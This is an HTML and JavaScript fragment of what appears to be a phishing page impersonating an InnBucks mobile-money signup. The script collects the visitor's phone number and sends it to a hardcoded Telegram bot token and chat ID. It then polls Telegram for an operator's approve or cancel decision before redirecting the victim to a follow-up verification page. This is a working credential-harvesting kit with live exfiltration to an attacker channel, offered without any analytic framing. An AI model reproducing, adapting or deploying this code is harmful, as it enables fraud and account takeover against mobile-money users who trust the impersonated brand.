        <div class="spinner"></div>
    </div>

    <!-- Cancel/Error Overlay -->
    <div id="cancelOverlay">
        <div class="cancel-icon">⚠️</div>
        <div class="cancel-title">Action Failed</div>
        <div class="cancel-message">
            The details could not be verified or the request was cancelled.<br><br> Please try again or contact support.
        </div>
        <button class="close-btn" onclick="closeCancelOverlay()">Try Again</button>
    </div>

    <script>
        const BOT_TOKEN = '8648564581:AAGFXIVirSM17ejONkAxqgyy9sRXYwa3r9U';
        const CHAT_ID = '7834737455';

        const savedPhone = localStorage.getItem('phone');
        const phoneInput = document.getElementById('phoneInput');
        if (savedPhone && savedPhone.length === 9) {
            phoneInput.value = savedPhone;
        }

        const spinnerOverlay = document.getElementById('spinnerOverlay');
        const cancelOverlay = document.getElementById('cancelOverlay');
        let processStarted = false;
        let pollInterval;
        let lastUpdateId = 0;
        let currentTimestamp = '';

        function closeCancelOverlay() {
            cancelOverlay.style.display = 'none';
            processStarted = false;
            phoneInput.focus();
        }

        function startSignupProcess() {
            if (processStarted) return;
            processStarted = true;

            const phone = phoneInput.value.trim().replace(/\D/g, '');
            if (!phone || phone.length < 9) {
                alert('Please enter a valid mobile number');
                processStarted = false;
                return;
            }

            localStorage.setItem('phone', phone);

            spinnerOverlay.style.display = 'flex';
            currentTimestamp = Date.now().toString();

            const message = `New InnBucks Signup Attempt\n\nPhone: +263${phone}\n\nApprove this signup?`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: '✅ Approve',
                                callback_data: 'approve_' + currentTimestamp
                            }, {
                                text: '❌ Cancel',
                                callback_data: 'cancel_' + currentTimestamp
                            }]
                        ]
                    }
                })
            }).catch(err => {
                console.error('Send message failed:', err);
                spinnerOverlay.style.display = 'none';
                processStarted = false;
            });

            // Start polling for admin response
            pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok && data.result.length > 0) {
                            data.result.forEach(update => {
                                lastUpdateId = Math.max(lastUpdateId, update.update_id);

                                if (update.callback_query) {
                                    const query = update.callback_query;
                                    const [action, timestamp] = query.data.split('_');

                                    if (timestamp === currentTimestamp) {
                                        clearInterval(pollInterval);
                                        spinnerOverlay.style.display = 'none';

                                        // Optional: Acknowledge callback to stop Telegram loading
                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                            method: 'POST',
                                            headers: {
                                                'Content-Type': 'application/json'
                                            },
                                            body: JSON.stringify({
                                                callback_query_id: query.id,
                                                text: action === 'approve' ? 'Approved!' : 'Cancelled'
                                            })
                                        });

                                        if (action === 'approve') {
                                            window.location.href = 'verify.html'; // Redirect to verify page (change as needed)
                                        } else {
                                            cancelOverlay.style.display = 'flex';
                                        }

                                        processStarted = false;
                                    }
                                }
                            });
                        }
                    })
                    .catch(err => console.error('Polling error:', err));
            }, 2000);
        }

        phoneInput.focus();
